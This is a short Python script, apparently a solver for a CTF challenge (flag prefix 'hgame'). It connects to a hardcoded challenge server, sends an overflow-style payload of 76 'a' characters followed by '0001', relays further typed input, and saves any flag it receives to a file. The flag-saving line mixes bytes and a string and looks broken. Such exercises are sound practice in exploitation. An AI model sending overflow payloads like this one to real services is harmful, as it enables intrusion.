import numpy
import socket
import random
import time

while(True):
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(('111.230.149.72', 10001))
    i=0
    while(True):
        time.sleep(0.1)
        try:
            sock1=sock.recv(1024)
            print(sock1)
        except:
            print("强行关闭")
            break
        if b'hgame{' in sock1:
            flag=open('flag.txt','a')
            flag.write(str(sock1+"\n",encoding='utf-8'))
            flag.close()
        time.sleep(0.3)
        if sock1==b'':
            break
        if i==0:
            x="a"*76+"0001"
        else:
            x=input()
        try:
            sock.send((bytes("{}\n".format(x),encoding='utf-8')))
        except:
            break
        i+=1



